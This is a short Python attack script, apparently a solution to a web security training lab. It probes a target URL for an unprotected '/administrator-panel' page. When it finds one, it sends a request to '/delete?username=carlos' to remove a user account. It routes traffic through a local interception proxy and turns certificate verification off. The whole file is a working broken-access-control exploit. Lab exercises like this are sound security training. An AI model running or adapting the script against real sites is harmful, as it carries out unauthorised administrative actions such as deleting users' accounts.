#!/usr/bin/python3

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_user(url):
    admin_panel_url = url + "/administrator-panel"
    r = requests.get(admin_panel_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("FOUND ADMIN PANEL>>>>>>>>>>")
        sys.stdout.write(">> Delete Carlos <<<")
        delete_carlos_url = admin_panel_url + "/delete?username=carlos"
        r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print(">>> Carlos User Delete << ")
        else:
            print("Not Delete USer........")
    else:
        print("Admin panel not found....")


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("finding.... Admin Panel...")
    delete_user(url)


if __name__ == "__main__":
    main()
